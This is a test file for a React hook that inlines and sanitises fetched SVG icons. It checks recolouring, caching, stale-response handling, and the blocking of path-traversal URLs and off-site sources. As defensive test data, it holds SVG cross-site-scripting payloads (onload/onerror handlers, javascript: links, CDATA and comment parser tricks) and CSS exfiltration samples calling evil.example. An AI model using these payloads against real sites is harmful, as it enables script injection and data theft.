import { renderHook, waitFor } from '@testing-library/react';
import { forgetInlineSvgs, useInlineSvg } from './useInlineSvg';

function mockFetchOnce(text: string) {
  return vi.fn().mockResolvedValue({ ok: true, text: async () => text });
}

describe('useInlineSvg', () => {
  afterEach(() => {
    forgetInlineSvgs();
    vi.unstubAllGlobals();
    vi.restoreAllMocks();
  });

  it('returns an empty string when no url is given', () => {
    const { result } = renderHook(() => useInlineSvg(undefined));
    expect(result.current).toBe('');
  });

  it('fetches the url and repoints hardcoded colors at currentColor', async () => {
    vi.stubGlobal(
      'fetch',
      mockFetchOnce(
        '<svg viewBox="0 0 10 10" fill="#ff0000" stroke="#00ff00"><path d="M0 0" /></svg>',
      ),
    );
    const { result } = renderHook(() => useInlineSvg('/assets/icons/gear.svg'));

    await waitFor(() => expect(result.current).not.toBe(''));
    expect(result.current).not.toContain('#ff0000');
    expect(result.current).not.toContain('#00ff00');
    expect(result.current).toContain('fill="currentColor"');
    expect(result.current).toContain('stroke="currentColor"');
  });

  it('keeps a stroke-outline icon stroked instead of flattening it into a fill', async () => {
    vi.stubGlobal(
      'fetch',
      mockFetchOnce(
        '<svg viewBox="0 0 48 48" fill="none"><path d="M9 17h24" stroke="#112233" stroke-width="3" /></svg>',
      ),
    );
    const { result } = renderHook(() => useInlineSvg('/assets/icons/cup.svg'));

    await waitFor(() => expect(result.current).not.toBe(''));
    expect(result.current).toContain('fill="none"');
    expect(result.current).toContain('stroke="currentColor"');
    expect(result.current).not.toContain('stroke:none');
    expect(result.current).not.toContain('#112233');
  });

  it('gives an icon that declares no paint a currentColor fill', async () => {
    vi.stubGlobal('fetch', mockFetchOnce('<svg viewBox="0 0 10 10"><path d="M0 0" /></svg>'));
    const { result } = renderHook(() => useInlineSvg('/assets/icons/plain.svg'));

    await waitFor(() => expect(result.current).not.toBe(''));
    expect(result.current).toContain('fill="currentColor"');
  });

  it('repoints fill and stroke declared in an inline style attribute', async () => {
    vi.stubGlobal(
      'fetch',
      mockFetchOnce(
        '<svg viewBox="0 0 10 10"><path style="fill:#ff0000;stroke:none" d="M0 0" /></svg>',
      ),
    );
    const { result } = renderHook(() => useInlineSvg('/assets/icons/styled.svg'));

    await waitFor(() => expect(result.current).not.toBe(''));
    expect(result.current).toContain('fill:currentColor');
    expect(result.current).toContain('stroke:none');
    expect(result.current).not.toContain('#ff0000');
  });

  it('resolves to an empty string when the fetched text has no <svg> element', async () => {
    vi.stubGlobal('fetch', mockFetchOnce('<html><body>not an icon</body></html>'));
    const { result, rerender } = renderHook(() => useInlineSvg('/assets/icons/broken.svg'));

    await waitFor(() => {
      rerender();
      expect(result.current).toBe('');
    });
  });

  it('silently ignores a rejected fetch (no crash, content stays empty)', async () => {
    vi.stubGlobal('fetch', vi.fn().mockRejectedValue(new Error('network down')));
    const { result } = renderHook(() => useInlineSvg('/assets/icons/gear.svg'));

    await new Promise((r) => setTimeout(r, 0));
    expect(result.current).toBe('');
  });

  it('discards a stale in-flight response after the url changes', async () => {
    let resolveFirst!: (value: { ok: boolean; text: () => Promise<string> }) => void;
    const fetchMock = vi
      .fn()
      .mockImplementationOnce(
        () =>
          new Promise((resolve) => {
            resolveFirst = resolve;
          }),
      )
      .mockResolvedValueOnce({ ok: true, text: async () => '<svg><path d="second" /></svg>' });
    vi.stubGlobal('fetch', fetchMock);

    const { result, rerender } = renderHook(({ url }) => useInlineSvg(url), {
      initialProps: { url: '/assets/icons/first.svg' },
    });

    rerender({ url: '/assets/icons/second.svg' });
    await waitFor(() => expect(result.current).toContain('second'));

    resolveFirst({ ok: true, text: async () => '<svg><path d="first" /></svg>' });
    await new Promise((r) => setTimeout(r, 0));

    expect(result.current).toContain('second');
    expect(result.current).not.toContain('first');
  });

  it('does not throw when the component unmounts before the fetch resolves', async () => {
    let resolveFetch!: (value: { ok: boolean; text: () => Promise<string> }) => void;
    vi.stubGlobal(
      'fetch',
      vi.fn().mockImplementation(
        () =>
          new Promise((resolve) => {
            resolveFetch = resolve;
          }),
      ),
    );

    const { unmount } = renderHook(() => useInlineSvg('/assets/icons/gear.svg'));
    unmount();

    expect(() => resolveFetch({ ok: true, text: async () => '<svg></svg>' })).not.toThrow();
    await new Promise((r) => setTimeout(r, 0));
  });

  it('shows an icon fetched earlier on the first render of a later mount', async () => {
    const fetchMock = mockFetchOnce('<svg><path d="gear" /></svg>');
    vi.stubGlobal('fetch', fetchMock);

    const first = renderHook(() => useInlineSvg('/assets/icons/gear.svg'));
    await waitFor(() => expect(first.result.current).toContain('gear'));
    first.unmount();

    const second = renderHook(() => useInlineSvg('/assets/icons/gear.svg'));
    expect(second.result.current).toContain('gear');
    await new Promise((r) => setTimeout(r, 0));
    expect(fetchMock).toHaveBeenCalledTimes(1);
  });

  it('shares one fetch between icons that mount together', async () => {
    const fetchMock = mockFetchOnce('<svg><path d="gear" /></svg>');
    vi.stubGlobal('fetch', fetchMock);

    const a = renderHook(() => useInlineSvg('/assets/icons/gear.svg'));
    const b = renderHook(() => useInlineSvg('/assets/icons/gear.svg'));
    await waitFor(() => expect(a.result.current).toContain('gear'));
    await waitFor(() => expect(b.result.current).toContain('gear'));
    expect(fetchMock).toHaveBeenCalledTimes(1);
  });

  it('fetches again after a failed fetch instead of caching the failure', async () => {
    const fetchMock = vi
      .fn()
      .mockResolvedValueOnce({ ok: false, text: async () => 'Not Found' })
      .mockResolvedValueOnce({ ok: true, text: async () => '<svg><path d="gear" /></svg>' });
    vi.stubGlobal('fetch', fetchMock);

    const first = renderHook(() => useInlineSvg('/assets/icons/gear.svg'));
    await waitFor(() => expect(fetchMock).toHaveBeenCalledTimes(1));
    await new Promise((r) => setTimeout(r, 0));
    expect(first.result.current).toBe('');
    first.unmount();

    const second = renderHook(() => useInlineSvg('/assets/icons/gear.svg'));
    await waitFor(() => expect(second.result.current).toContain('gear'));
    expect(fetchMock).toHaveBeenCalledTimes(2);
  });

  it('fetches again once the cache is forgotten', async () => {
    const fetchMock = vi
      .fn()
      .mockResolvedValueOnce({ ok: true, text: async () => '<svg><path d="old" /></svg>' })
      .mockResolvedValueOnce({ ok: true, text: async () => '<svg><path d="new" /></svg>' });
    vi.stubGlobal('fetch', fetchMock);

    const first = renderHook(() => useInlineSvg('/assets/icons/gear.svg'));
    await waitFor(() => expect(first.result.current).toContain('old'));
    first.unmount();

    forgetInlineSvgs();
    const second = renderHook(() => useInlineSvg('/assets/icons/gear.svg'));
    await waitFor(() => expect(second.result.current).toContain('new'));
  });

  // A bound icon field takes whatever a writable tag holds; `../` from the icons
  // folder reached an endpoint that echoes its query into the response.
  it.each([
    '/assets/icons/../../api/historian/query?start=-1h&variables=%3Csvg%20onload=alert(1)%3E',
    '/assets/icons/%2e%2e/%2e%2e/api/x.svg',
    'https://evil.example/assets/icons/x.svg',
    '/assets/images/x.svg',
  ])('never fetches %s', async (value) => {
    const fetchMock = mockFetchOnce('<svg onload="alert(1)"/>');
    vi.stubGlobal('fetch', fetchMock);
    const { result } = renderHook(() => useInlineSvg(value));

    await new Promise((r) => setTimeout(r, 0));
    expect(fetchMock).not.toHaveBeenCalled();
    expect(result.current).toBe('');
  });
});

describe('useInlineSvg sanitising', () => {
  let n = 0;

  afterEach(() => {
    forgetInlineSvgs();
    vi.unstubAllGlobals();
  });

  /** The hook's markup for a fetched file, parsed the way a widget's innerHTML parses it. */
  async function rendered(file: string): Promise<HTMLElement> {
    const fetchMock = mockFetchOnce(file);
    vi.stubGlobal('fetch', fetchMock);
    const url = `/assets/icons/file-${n++}.svg`;
    const { result } = renderHook(() => useInlineSvg(url));
    await waitFor(() => expect(fetchMock).toHaveBeenCalled());
    await new Promise((r) => setTimeout(r, 0));
    const host = document.createElement('div');
    host.innerHTML = result.current;
    return host;
  }

  function expectInert(host: HTMLElement) {
    expect(
      host.querySelector('script, foreignObject, img, iframe, a, animate, set, image'),
    ).toBeNull();
    for (const el of host.querySelectorAll('*')) {
      for (const attr of el.attributes) {
        expect(attr.name.toLowerCase()).not.toMatch(/^on/);
        if (attr.localName === 'href') expect(attr.value.startsWith('#')).toBe(true);
      }
    }
  }

  it('drops script, foreignObject, links, animation and every event handler', async () => {
    const host = await rendered(
      '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" onload="alert(1)">' +
        '<script>alert(2)</script>' +
        '<foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><img src="x" onerror="alert(3)"/></div></foreignObject>' +
        '<a href="javascript:alert(4)"><path d="M0 0"/></a>' +
        '<set attributeName="onmouseover" to="alert(5)"/>' +
        '<image href="https://evil.example/x.png"/>' +
        '<path d="M1 1" onclick="alert(6)" ONMOUSEOVER="alert(7)"/>' +
        '</svg>',
    );

    expectInert(host);
    expect(host.querySelector('path[d="M1 1"]')).not.toBeNull();
  });

  it('keeps fragment references and drops every outside one', async () => {
    const host = await rendered(
      '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">' +
        '<defs><linearGradient id="g"><stop offset="0"/></linearGradient><path id="p" d="M0 0"/></defs>' +
        '<use href="#p"/>' +
        '<use id="ext" href="https://evil.example/x.svg#p"/>' +
        '<use id="xl" xlink:href="data:image/svg+xml,&lt;svg onload=alert(1)&gt;"/>' +
        '<rect id="r1" style="clip-path:url(#g)" mask="url(#g)"/>' +
        '<rect id="r2" style="fill:url(https://evil.example/t.png)" mask="url( \'https://evil.example/m\' )"/>' +
        '<rect id="r3" style="fill:\\75 rl(https://evil.example/t.png)"/>' +
        '<rect id="r4" style="mask:image-set(\'https://evil.example/m.png\' 1x)"/>' +
        '</svg>',
    );

    expectInert(host);
    expect(host.querySelector('use[href="#p"]')).not.toBeNull();
    expect(host.querySelector('#ext')?.hasAttribute('href')).toBe(false);
    expect(host.querySelector('#xl')?.attributes).toHaveLength(1);
    expect(host.querySelector('#r1')?.getAttribute('mask')).toBe('url(#g)');
    expect(host.querySelector('#r1')?.getAttribute('style')).toContain('url(#g)');
    for (const id of ['#r2', '#r3', '#r4']) {
      expect(host.querySelector(id)?.hasAttribute('style')).toBe(false);
    }
    expect(host.querySelector('#r2')?.hasAttribute('mask')).toBe(false);
  });

  it('drops a style block that loads from outside, keeps one that does not', async () => {
    const host = await rendered(
      '<svg xmlns="http://www.w3.org/2000/svg">' +
        '<style>@import "https://evil.example/x.css";</style>' +
        '<style>input[value^="a"]{background:url(https://evil.example/a)}</style>' +
        '<style>.st0{opacity:.5}</style>' +
        '<path class="st0" d="M0 0"/>' +
        '</svg>',
    );

    const styles = host.querySelectorAll('style');
    expect(styles).toHaveLength(1);
    expect(styles[0].textContent).toBe('.st0{opacity:.5}');
  });

  // Comments, processing instructions and CDATA read differently to the HTML
  // parser than to the XML one, which is how markup could slip through as text.
  it.each([
    ['a comment', '<svg><!--><img src="x" onerror="alert(1)">--></svg>'],
    ['a processing instruction', '<svg><?x ><img src="x" onerror="alert(1)">?></svg>'],
    [
      'a CDATA section',
      '<svg><style><![CDATA[</style><img src="x" onerror="alert(1)">]]></style></svg>',
    ],
    [
      'an element in the XHTML namespace',
      '<svg xmlns="http://www.w3.org/2000/svg"><g xmlns="http://www.w3.org/1999/xhtml"><img src="x" onerror="alert(1)"/></g></svg>',
    ],
    [
      'a prefixed element',
      '<svg xmlns:h="http://www.w3.org/1999/xhtml"><h:img src="x" onerror="alert(1)"/></svg>',
    ],
  ])('lets no markup through %s', async (_label, file) => {
    const host = await rendered(file);

    expectInert(host);
  });

  it('draws nothing from a file that is not well-formed SVG', async () => {
    const host = await rendered('<svg><img src="x" onerror="alert(1)"></svg>');

    expect(host.innerHTML).toBe('');
  });
});
